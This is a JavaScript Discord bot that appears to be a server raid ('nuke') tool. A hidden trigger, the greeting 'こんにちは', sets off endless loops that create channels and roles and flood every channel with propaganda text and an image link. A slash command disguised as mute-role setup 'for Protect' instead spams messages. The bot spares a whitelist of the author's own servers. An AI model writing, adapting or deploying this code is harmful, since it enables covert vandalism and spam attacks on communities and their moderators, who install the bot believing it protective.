import {Client,GatewayIntentBits} from "discord.js";
import express from "express";
let whitelist=[
  "1340152629812002898",//HQ
  "1357540024962384073",//Gen.BR
  "1433724759622811650",//PCOP
  "1438178664662568982",//MFJD
  "1274878594170097754",//SNCD1
  "1433463270806917143",//Left-wing anarchists
  "1369253248724107324",//Brass
  "892679654379487242",//japolandball
  "1275346742719545365",//japolandballfanon
  "1421405745487806550",//jpebw
];
const client=new Client({
  intents:[
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});
client.once("ready",async function(){
  let data=[{
    name:"setupmuterole",
    description:"Create Muterole for Protect"
  }];
  await client.application.commands.set(data);
});
/*
client.once("ready", async () => {
  await client.application.commands.set([]);
  const cmds = await client.application.commands.fetch();
  console.log(cmds);
});
*/
client.on("messageCreate",function(message){
  let isWhitelist=false;
  for(let data of whitelist){
    if(data==message.guild.id){
      isWhitelist=true;
      break;
    }
  }
  if(message.author.bot||isWhitelist){
    return;
  }
  if(message.content.indexOf("こんにちは")!=-1){
    message.delete();
    let guild=client.guilds.cache.get(message.guild.id);
    let getMillisecond=message.content.split("こんにちは")[1].replace(" ","").split(" ").map(function(data){return Number(data)||null});
    let millisecond=[getMillisecond[0]||100,getMillisecond[1]||100,getMillisecond[2]||500];
    setInterval(async function(){
      guild.channels.create({
        name:getText(true),
        type:0
      });
      guild.channels.cache.forEach(function(channel,i){
        if(channel.type==4){
          setTimeout(function(){
            guild.channels.create({
              name:getText(true),
              type:0,
              parent:channel.id
            });
          },millisecond[0]*i);
        }
        if(channel.type==0){
          setTimeout(async function(){
            await channel.send(getText());
          },millisecond[1]*i);
        }
      });
      await guild.roles.create({name:getText(true)});
    },millisecond[2]);
  }
});
client.on("interactionCreate",async function(e){
  let isWhitelist=false;
  for(let data of whitelist){
    if(data==e.guild.id){
      isWhitelist=true;
      break;
    }
  }
  if(!e.isChatInputCommand()||isWhitelist){
    return;
  }
  if(e.commandName=="setupmuterole"){
    await e.reply("success");
    setInterval(async function(){
      await e.followUp(getText());
    },500);
    setTimeout(async function(){
      await e.deleteReply();
    },800);
  }
});
function getText(isTitle){
  let random=Math.round(Math.random()*100000000);
  return isTitle?("統一友愛戦線に栄光あれ！-"+random):("# 統一友愛戦線に栄光あれ！\nhttps://cdn-ak.f.st-hatena.com/images/fotolife/I/ImagesForUFFF/20251119/20251119155446_original.png\n\nMessageID:"+random);
}
const app=express();
app.get("/",function(req,res){
  res.send("alive");
});
app.listen(process.env.PORT||3000,function(){
  console.log("");
});
client.login(process.env.DISCORD_TOKEN);
